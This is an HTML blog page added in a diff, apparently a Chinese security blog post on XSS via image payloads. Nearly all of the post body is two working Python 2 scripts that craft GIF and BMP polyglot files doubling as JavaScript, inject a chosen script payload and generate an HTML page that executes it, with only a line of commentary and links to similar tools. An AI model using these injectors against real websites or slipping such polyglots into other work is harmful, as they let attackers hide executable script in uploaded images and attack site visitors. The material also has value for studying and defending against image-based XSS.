@@ -1,0 +1,676 @@
+<!doctype html>
+<html class="theme-next use-motion theme-next-mist">
+<head>
+  
+
+<meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+
+
+
+
+  <link rel="stylesheet" type="text/css" href="/vendors/fancybox/source/jquery.fancybox.css?v=2.1.5"/>
+
+
+<link rel="stylesheet" type="text/css" href="/css/main.css?v=0.4.3"/>
+
+
+    <meta name="description" content="关于计算机科学的学习经历与精彩文章分享。" />
+
+
+
+  <meta name="keywords" content="xss," />
+
+
+
+
+
+  <link rel="shorticon icon" type="image/x-icon" href="/favicon.ico?v=0.4.3" />
+
+
+
+<script type="text/javascript" id="hexo.configuration">
+  var CONFIG = {
+    scheme: 'Mist',
+    analytics: {
+      google: ''
+    },
+    sidebar: 'post'
+  };
+</script>
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//hm.baidu.com/hm.js?351a523b2429a0dda1b90bb708a00fad";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+  <title> 在xss中使用gif图片payloads // Neurohazard </title>
+</head>
+
+<body>
+  <!--[if lte IE 8]>
+  <div style=' clear: both; height: 59px; padding:0 0 0 15px; position: relative;margin:0 auto;'>
+    <a href="http://windows.microsoft.com/en-US/internet-explorer/products/ie/home?ocid=ie6_countdown_bannercode">
+      <img src="http://7u2nvr.com1.z0.glb.clouddn.com/picouterie.jpg" border="0" height="42" width="820"
+           alt="You are using an outdated browser. For a faster, safer browsing experience, upgrade for free today or use other browser ,like chrome firefox safari."
+           style='margin-left:auto;margin-right:auto;display: block;'/>
+    </a>
+  </div>
+<![endif]-->
+
+  <div class="container one-column page-post-detail">
+    <div class="headband"></div>
+
+    <div id="header" class="header">
+      <div class="header-inner">
+        <h1 class="site-meta">
+  <span class="logo-line-before"><i></i></span>
+  <a href="/" class="brand">
+      <span class="logo">
+        <i class="icon-logo"></i>
+      </span>
+      <span class="site-title">Neurohazard</span>
+  </a>
+  <span class="logo-line-after"><i></i></span>
+</h1>
+
+<div class="site-nav-toggle">
+  <button>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+  </button>
+</div>
+
+<div class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu ">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/">
+            <i class="menu-item-icon icon-home"></i> <br />
+            首頁
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about">
+            <i class="menu-item-icon icon-about"></i> <br />
+            關於
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives">
+            <i class="menu-item-icon icon-archives"></i> <br />
+            歸檔
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags">
+            <i class="menu-item-icon icon-tags"></i> <br />
+            標籤
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-friend">
+          <a href="/friend">
+            <i class="menu-item-icon icon-friend"></i> <br />
+            友情鏈接
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-reading-list">
+          <a href="/reading-list">
+            <i class="menu-item-icon icon-reading-list"></i> <br />
+            閱讀清單
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+</div>
+
+
+      </div>
+    </div>
+
+    <div id="main" class="main">
+      <div class="main-inner">
+        <div id="content" class="content">
+          
+
+  <div id="posts" class="posts-expand">
+    
+
+  <div class="post post-type-normal ">
+    <div class="post-header">
+
+      
+      
+        <h1 class="post-title">
+          
+          
+            
+              在xss中使用gif图片payloads
+            
+          
+        </h1>
+      
+
+      <div class="post-meta">
+        <span class="post-time">
+          發表於 2017-02-15
+        </span>
+
+        
+          <span class="post-category">
+            &nbsp; | &nbsp; 分類於
+            
+              <a href="/categories/信息安全/">信息安全</a>
+
+              
+              
+
+            
+          </span>
+        
+
+        
+          
+            <span class="post-comments-count">
+            &nbsp; | &nbsp;
+            <a href="/2017/02/15/gif-xss-payloads/#comments" >
+              <span class="post-comments-count ds-thread-count" data-thread-key="2017/02/15/gif-xss-payloads/"></span>
+            </a>
+          </span>
+          
+        
+      </div>
+    </div>
+
+    <div class="post-body">
+
+      
+      
+
+      
+        <h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>首先，以下脚本是一个向gif文件中注入JavaScript的脚本：</p>
+<p><a href="http://pastebin.com/6yUbfGX5" target="_blank" rel="external">http://pastebin.com/6yUbfGX5</a></p>
+<figure class="highlight julia"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment">#============================================================================================================#</span></span><br><span class="line"><span class="comment">#======= Simply injects a JavaScript Payload into a GIF. ====================================================#</span></span><br><span class="line"><span class="comment">#======= or it creates a JavaScript Payload as a GIF.    ====================================================#</span></span><br><span class="line"><span class="comment">#======= The resulting GIF must be a valid (not corrupted) GIF. =============================================#</span></span><br><span class="line"><span class="comment">#======= Author: marcoramilli.blogspot.com ==================================================================#</span></span><br><span class="line"><span class="comment">#======= Version: PoC (don't even think to use it in development env.) ======================================#</span></span><br><span class="line"><span class="comment">#======= Disclaimer: ========================================================================================#</span></span><br><span class="line"><span class="comment">#THIS IS NOT PEP3 FORMATTED</span></span><br><span class="line"><span class="comment">#THIS SOFTWARE IS PROVIDED BY THE AUTHOR "AS IS" AND ANY EXPRESS OR</span></span><br><span class="line"><span class="comment">#IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED</span></span><br><span class="line"><span class="comment">#WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE</span></span><br><span class="line"><span class="comment">#DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,</span></span><br><span class="line"><span class="comment">#INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES</span></span><br><span class="line"><span class="comment">#(INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR</span></span><br><span class="line">								<span class="comment">#SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)</span></span><br><span class="line">								<span class="comment">#HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,</span></span><br><span class="line"><span class="comment">#STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING</span></span><br><span class="line"><span class="comment">#IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE</span></span><br><span class="line"><span class="comment">#POSSIBILITY OF SUCH DAMAGE.</span></span><br><span class="line"><span class="comment">#===========================================================================================================#</span></span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#---------------------------------------------------------</span></span><br><span class="line">def _hexify(num):</span><br><span class="line">	<span class="string">"""</span><br><span class="line">	Converts and formats to hexadecimal</span><br><span class="line">	"""</span></span><br><span class="line">	num = <span class="string">"%x"</span> % num</span><br><span class="line">	<span class="keyword">if</span> len(num) % <span class="number">2</span>:</span><br><span class="line">		num = <span class="string">'0'</span>+num</span><br><span class="line">	<span class="keyword">return</span> num.decode('hex')</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#---------------------------------------------------------</span></span><br><span class="line">def _generate_and_write_to_file(payload, fname):</span><br><span class="line">    <span class="string">"""</span><br><span class="line">    Generates a fake but valid GIF within scriting</span><br><span class="line">    """</span></span><br><span class="line">    f = open(fname, <span class="string">"wb"</span>)</span><br><span class="line">    header = (b'\x47\x49\x46\x38\x39\x61'  <span class="comment">#Signature + Version  GIF89a</span></span><br><span class="line">                        b'\x2F\x2A' <span class="comment">#Encoding /* it's a valid Logical Screen Width</span></span><br><span class="line">                        b'\x0A\x00' <span class="comment">#Smal Logical Screen Height</span></span><br><span class="line">                        b<span class="string">'\x00'</span> <span class="comment">#GCTF</span></span><br><span class="line">                        b<span class="string">'\xFF'</span> <span class="comment">#BackgroundColor</span></span><br><span class="line">                        b<span class="string">'\x00'</span> <span class="comment">#Pixel Ratio</span></span><br><span class="line">                        b'\x2C\x00\x00\x00\x00\x2F\x2A\x0A\x00\x00\x02\x00\x3B' <span class="comment">#GlobalColorTable + Blocks</span></span><br><span class="line">                        b'\x2A\x2F' <span class="comment">#Commenting out */</span></span><br><span class="line">                        b'\x3D\x31\x3B' <span class="comment"># enable the script side by introducing =1;</span></span><br><span class="line">				        )</span><br><span class="line">    trailer = b<span class="string">'\x3B'</span></span><br><span class="line">	<span class="comment"># I made this explicit, step by step .</span></span><br><span class="line">    f.write(header)</span><br><span class="line">    f.write(payload)</span><br><span class="line">    f.write(trailer)</span><br><span class="line">    f.close()</span><br><span class="line">    <span class="keyword">return</span> True</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#---------------------------------------------------------</span></span><br><span class="line">def _generate_launching_page(f):</span><br><span class="line">	<span class="string">"""</span><br><span class="line">	Creates the HTML launching page</span><br><span class="line">	"""</span></span><br><span class="line">	htmlpage =<span class="string">"""</span><br><span class="line">								&lt;html&gt;</span><br><span class="line">								&lt;head&gt;&lt;title&gt;Opening an image&lt;/title&gt; &lt;/head&gt;</span><br><span class="line">								&lt;body&gt;</span><br><span class="line">									&lt;img src=\""""</span> + f + <span class="string">"""_malw.gif\"\&gt;</span><br><span class="line">									&lt;script src= \""""</span> + f + <span class="string">"""_malw.gif\"&gt; &lt;/script&gt;</span><br><span class="line">								&lt;/body&gt;</span><br><span class="line">								&lt;/html&gt;</span><br><span class="line">			  """</span></span><br><span class="line">	html = open(<span class="string">"run.html"</span>, <span class="string">"wb"</span>)</span><br><span class="line">	html.write(htmlpage);</span><br><span class="line">	html.close()</span><br><span class="line">	<span class="keyword">return</span> True</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#---------------------------------------------------------</span></span><br><span class="line">def _inject_into_file(payload, fname):</span><br><span class="line">	<span class="string">"""</span><br><span class="line">	Injects the payload into existing GIF</span><br><span class="line">	NOTE: if the GIF contains \xFF\x2A and/or \x2A\x5C might caouse issues</span><br><span class="line">	"""</span></span><br><span class="line">	<span class="comment"># I know, I can do it all in memory and much more fast.</span></span><br><span class="line">	<span class="comment"># I wont do it here.</span></span><br><span class="line">	with open(fname + <span class="string">"_malw.gif"</span>, <span class="string">"w+b"</span>) as fout:</span><br><span class="line">		with open(fname, <span class="string">"rt"</span>) as fin:</span><br><span class="line">			<span class="keyword">for</span> line <span class="keyword">in</span> fin:</span><br><span class="line">				ls1 = line.replace(b'\x2A\x2F', b'\x00\x00')</span><br><span class="line">				ls2 = ls1.replace(b'\x2F\x2A', b'\x00\x00')				</span><br><span class="line">				fout.write(ls2)	            	</span><br><span class="line">		fout.seek(<span class="number">6</span>,<span class="number">0</span>)</span><br><span class="line">		fout.write(b'\x2F\x2A') <span class="comment">#/*</span></span><br><span class="line"></span><br><span class="line">	f = open(fname + <span class="string">"_malw.gif"</span>, <span class="string">"a+b"</span>) <span class="comment">#appending mode</span></span><br><span class="line">	f.write(b'\x2A\x2F\x3D\x31\x3B')</span><br><span class="line">	f.write(payload)</span><br><span class="line">	f.write(b<span class="string">'\x3B'</span>)</span><br><span class="line">	f.close()</span><br><span class="line">	<span class="keyword">return</span> True</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#---------------------------------------------------------</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">	parser = argparse.ArgumentParser()</span><br><span class="line">	parser.add_argument(<span class="string">"filename"</span>,help=<span class="string">"the gif file name to be generated/or infected"</span>)</span><br><span class="line">	parser.add_argument(<span class="string">"js_payload"</span>,help=<span class="string">"the payload to be injected. For exmample: \"alert(\"test\");\""</span>)</span><br><span class="line">	parser.add_argument(<span class="string">"-i"</span>, <span class="string">"--inject-to-existing-gif"</span>, action=<span class="string">"store_true"</span>, help=<span class="string">"inject into the current gif"</span>)</span><br><span class="line">	args = parser.parse_args()</span><br><span class="line">	print(<span class="string">"""</span><br><span class="line">					|======================================================================================================|</span><br><span class="line">					| [!] legal disclaimer: usage of this tool for injecting malware to be propagated is illegal.          |</span><br><span class="line">					| It is the end user's responsibility to obey all applicable local, state and federal laws.            |</span><br><span class="line">					| Authors assume no liability and are not responsible for any misuse or damage caused by this program  |</span><br><span class="line">					|======================================================================================================|</span><br><span class="line">					"""</span></span><br><span class="line">         )</span><br><span class="line">	<span class="keyword">if</span> args.inject_to_existing_gif:</span><br><span class="line">		 _inject_into_file(args.js_payload, args.filename)</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		_generate_and_write_to_file(args.js_payload, args.filename)</span><br><span class="line"></span><br><span class="line">	_generate_launching_page(args.filename)</span><br><span class="line">	print <span class="string">"[+] Finished!"</span></span><br></pre></td></tr></table></figure>
+<p>还有这个，是向bmp中注入的：</p>
+<p><a href="http://pastebin.com/04y7ee3u" target="_blank" rel="external">http://pastebin.com/04y7ee3u</a></p>
+<figure class="highlight julia"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment">#============================================================================================================#</span></span><br><span class="line"><span class="comment">#======= Simply injects a JavaScript Payload into a BMP. ====================================================#</span></span><br><span class="line"><span class="comment">#======= The resulting BMP must be a valid (not corrupted) BMP. =============================================#</span></span><br><span class="line"><span class="comment">#======= Author: marcoramilli.blogspot.com ==================================================================#</span></span><br><span class="line"><span class="comment">#======= Version: PoC (don't even think to use it in development env.) ======================================#</span></span><br><span class="line"><span class="comment">#======= Disclaimer: ========================================================================================#</span></span><br><span class="line"><span class="comment">#THIS SOFTWARE IS PROVIDED BY THE AUTHOR "AS IS" AND ANY EXPRESS OR</span></span><br><span class="line"><span class="comment">#IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED</span></span><br><span class="line"><span class="comment">#WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE</span></span><br><span class="line"><span class="comment">#DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,</span></span><br><span class="line"><span class="comment">#INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES</span></span><br><span class="line"><span class="comment">#(INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR</span></span><br><span class="line">								<span class="comment">#SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)</span></span><br><span class="line">								<span class="comment">#HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,</span></span><br><span class="line"><span class="comment">#STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING</span></span><br><span class="line"><span class="comment">#IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE</span></span><br><span class="line"><span class="comment">#POSSIBILITY OF SUCH DAMAGE.</span></span><br><span class="line"><span class="comment">#===========================================================================================================#</span></span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="comment">#---------------------------------------------------------</span></span><br><span class="line">def _hexify(num):</span><br><span class="line">	<span class="string">"""</span><br><span class="line">	Converts and formats to hexadecimal</span><br><span class="line">	"""</span></span><br><span class="line">	num = <span class="string">"%x"</span> % num</span><br><span class="line">	<span class="keyword">if</span> len(num) % <span class="number">2</span>:</span><br><span class="line">		num = <span class="string">'0'</span>+num</span><br><span class="line">	<span class="keyword">return</span> num.decode('hex')</span><br><span class="line"></span><br><span class="line"><span class="comment">#---------------------------------------------------------</span></span><br><span class="line"><span class="comment">#Example payload: "var _0xe428=[\""+ b'\x48\x65\x6C\x6C\x6F\x20\x57\x6F\x72\x6C\x64' + "\"]</span></span><br><span class="line"><span class="comment">#;alert(_0xe428[0]);"</span></span><br><span class="line">def _generate_and_write_to_file(payload, fname):</span><br><span class="line">	<span class="string">"""</span><br><span class="line">	Generates a fake but valid BMP within scriting</span><br><span class="line">	"""</span></span><br><span class="line">	f = open(fname, <span class="string">"wb"</span>)</span><br><span class="line">	header = (b'\x42\x4D'  <span class="comment">#Signature BM</span></span><br><span class="line">						b'\x2F\x2A\x00\x00' <span class="comment">#Header File size, but encoded as /* &lt;-- Yes it's a valid header</span></span><br><span class="line">						b'\x00\x00\x00\x00' <span class="comment">#Reserved</span></span><br><span class="line">						b'\x00\x00\x00\x00' <span class="comment">#bitmap data offset</span></span><br><span class="line">						b''+ _hexify( len(payload) ) + <span class="comment">#bitmap header size</span></span><br><span class="line">					  b'\x00\x00\x00\x14' <span class="comment">#width 20pixel .. it's up to you</span></span><br><span class="line">						b'\x00\x00\x00\x14' <span class="comment">#height 20pixel .. it's up to you</span></span><br><span class="line">					  b'\x00\x00' <span class="comment">#nb_plan</span></span><br><span class="line">						b'\x00\x00' <span class="comment">#nb per pixel</span></span><br><span class="line">						b'\x00\x10\x00\x00' <span class="comment">#compression type</span></span><br><span class="line">						b'\x00\x00\x00\x00' <span class="comment">#image size .. its ignored</span></span><br><span class="line">						b'\x00\x00\x00\x01' <span class="comment">#Horizontal resolution</span></span><br><span class="line">						b'\x00\x00\x00\x01' <span class="comment">#Vertial resolution</span></span><br><span class="line">						b'\x00\x00\x00\x00' <span class="comment">#number of colors</span></span><br><span class="line">						b'\x00\x00\x00\x00' <span class="comment">#number important colors</span></span><br><span class="line">						b'\x00\x00\x00\x80' <span class="comment">#palet colors to be complient</span></span><br><span class="line">						b'\x00\x80\xff\x80' <span class="comment">#palet colors to be complient</span></span><br><span class="line">						b'\x80\x00\xff\x2A' <span class="comment">#palet colors to be complient</span></span><br><span class="line">						b'\x2F\x3D\x31\x3B' <span class="comment">#*/=1;</span></span><br><span class="line">						)</span><br><span class="line">	<span class="comment"># I made this explicit, step by step .</span></span><br><span class="line">	f.write(header)</span><br><span class="line">	f.write(payload)</span><br><span class="line">	f.close()</span><br><span class="line">	<span class="keyword">return</span> True</span><br><span class="line"></span><br><span class="line"><span class="comment">#---------------------------------------------------------</span></span><br><span class="line">def _generate_launching_page(f):</span><br><span class="line">	<span class="string">"""</span><br><span class="line">	Creates the HTML launching page</span><br><span class="line">	"""</span></span><br><span class="line"></span><br><span class="line">	htmlpage =<span class="string">"""</span><br><span class="line">								&lt;html&gt;</span><br><span class="line">								&lt;head&gt;&lt;title&gt;Opening an image&lt;/title&gt; &lt;/head&gt;</span><br><span class="line">								&lt;body&gt;</span><br><span class="line">									&lt;img src=\""""</span> + f + <span class="string">"""\"\&gt;</span><br><span class="line">									&lt;script src= \""""</span> + f + <span class="string">"""\"&gt; &lt;/script&gt;</span><br><span class="line">								&lt;/body&gt;</span><br><span class="line">								&lt;/html&gt;</span><br><span class="line">						"""</span></span><br><span class="line">	html = open(<span class="string">"run.html"</span>, <span class="string">"wb"</span>)</span><br><span class="line">	html.write(htmlpage);</span><br><span class="line">	html.close()</span><br><span class="line">	<span class="keyword">return</span> True</span><br><span class="line"></span><br><span class="line"><span class="comment">#---------------------------------------------------------</span></span><br><span class="line">def _inject_into_file(payload, fname):</span><br><span class="line">	<span class="string">"""</span><br><span class="line">	Injects the payload into existing BMP</span><br><span class="line">	NOTE: if the BMP contains \xFF\x2A might caouse issues</span><br><span class="line">	"""</span></span><br><span class="line">	<span class="comment"># I know, I can do it all in memory and much more fast.</span></span><br><span class="line">	<span class="comment"># I wont do it here.</span></span><br><span class="line">	f = open(fname, <span class="string">"r+b"</span>)</span><br><span class="line">	b = f.read()</span><br><span class="line">	b.replace(b'\x2A\x2F',b'\x00\x00')</span><br><span class="line">	f.close()</span><br><span class="line"></span><br><span class="line">	f = open(fname, <span class="string">"w+b"</span>)</span><br><span class="line">	f.write(b)</span><br><span class="line">	f.seek(<span class="number">2</span>,<span class="number">0</span>)</span><br><span class="line">	f.write(b'\x2F\x2A')</span><br><span class="line">	f.close()</span><br><span class="line"></span><br><span class="line">	f = open(fname, <span class="string">"a+b"</span>)</span><br><span class="line">	f.write(b'\xFF\x2A\x2F\x3D\x31\x3B')</span><br><span class="line">	f.write(payload)</span><br><span class="line">	f.close()</span><br><span class="line">	<span class="keyword">return</span> True</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#---------------------------------------------------------</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">	parser = argparse.ArgumentParser()</span><br><span class="line">	parser.add_argument(<span class="string">"filename"</span>,help=<span class="string">"the bmp file name to be generated/or infected"</span>)</span><br><span class="line">	parser.add_argument(<span class="string">"js_payload"</span>,help=<span class="string">"the payload to be injected. For exmample: \"alert(\"test\");\""</span>)</span><br><span class="line">	parser.add_argument(<span class="string">"-i"</span>, <span class="string">"--inject-to-existing-bmp"</span>, action=<span class="string">"store_true"</span>, help=<span class="string">"inject into the current bitmap"</span>)</span><br><span class="line">	args = parser.parse_args()</span><br><span class="line">	print(<span class="string">"""</span><br><span class="line">					|======================================================================================================|</span><br><span class="line">					| [!] legal disclaimer: usage of this tool for injecting malware to be propagated is illegal.          |</span><br><span class="line">					| It is the end user's responsibility to obey all applicable local, state and federal laws.            |</span><br><span class="line">					| Authors assume no liability and are not responsible for any misuse or damage caused by this program  |</span><br><span class="line">					|======================================================================================================|</span><br><span class="line">					"""</span>)</span><br><span class="line">	<span class="keyword">if</span> args.inject_to_existing_bmp:</span><br><span class="line">		 _inject_into_file(args.js_payload, args.filename)</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		_generate_and_write_to_file(args.js_payload, args.filename)</span><br><span class="line"></span><br><span class="line">	_generate_launching_page(args.filename)</span><br><span class="line">	print <span class="string">"[+] Finished!"</span></span><br></pre></td></tr></table></figure>
+<p>两个都是用python写的，其中，我们注意到他们的重点是：</p>
+<p>对文件头部进行的处理</p>
+<p>也有用C或者ASM做的工具：</p>
+<p><a href="https://github.com/jklmnn/imagejs" target="_blank" rel="external">https://github.com/jklmnn/imagejs</a></p>
+<p><a href="https://gist.github.com/ajinabraham/f2a057fb1930f94886a3" target="_blank" rel="external">https://gist.github.com/ajinabraham/f2a057fb1930f94886a3</a></p>
+<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p>[1] <a href="http://mp.weixin.qq.com/s?timestamp=1487153931&amp;src=3&amp;ver=1&amp;signature=VKwHl7aOtkJgM8gNSEEWwDsF-6kL4XZVpOcsBWu38pXbzwBpANYmjPSyn3JTDBDR89lkpkRX7iX7p07Cqk744S5rRVciAaTu5*4-HVXfYcweMl-xjw*mCgGhRyDdPVRXq-KED*jMXtlEBm0GpVbW5o2edmR30G-vsE5*SsvAmIY=" target="_blank" rel="external">浅析图片XSS中的哪些技术问题 -  嘶吼专业版</a></p>
+
+      
+    </div>
+
+    <div class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/xss/"> #xss </a>
+          
+        </div>
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2017/02/16/graph-theory/">图论</a>
+            
+          </div>
+
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2017/02/14/dex2jar-enjarify/">Android 逆向工具 dex2jar, enjarify 和 AXMLPrinter2</a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </div>
+  </div>
+
+
+
+    
+      <div class="post-spread">
+        <!-- JiaThis Button BEGIN -->
+<div class="jiathis_style">
+  <a class="jiathis_button_tsina"></a>
+  <a class="jiathis_button_tqq"></a>
